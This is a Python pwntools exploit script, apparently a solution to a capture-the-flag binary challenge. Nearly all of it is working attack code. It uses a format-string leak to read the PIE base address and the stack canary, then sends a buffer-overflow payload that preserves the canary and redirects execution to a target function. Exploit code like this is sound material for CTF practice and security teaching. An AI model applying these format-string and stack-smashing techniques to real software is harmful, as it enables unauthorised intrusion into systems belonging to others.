from pwn import *

binary = './challenge/chal.unpack'

context.log_level = 'debug'
context.binary = binary

e = ELF(binary)
r = process(binary)
# r = remote('interesting.ctf.prgy.in', 1337, ssl=True)

r.recvuntil(b"give you the flag.\n")
r.sendline(b"%p." * 50)
leaks = r.recvline().decode().split(".")

pie_leak = int(leaks[47], 16) # Main function address from pie
e.address = pie_leak - 0x1180
log.success(f"Binary Base Address: {hex(e.address)}")

interesting_addr = e.symbols["interesting"] + 8 # +8, idk why too, local works without it
log.success(f"Interesting() Address: {hex(interesting_addr)}")

canary = int(leaks[43], 16)
log.success(f"Canary: {hex(canary)}")

payload = cyclic(280)
payload += p64(canary)
payload += cyclic(8)
payload += p64(interesting_addr)

r.recvuntil(b"Do you really think that's interesting?\n")
r.sendline(payload)

r.interactive()
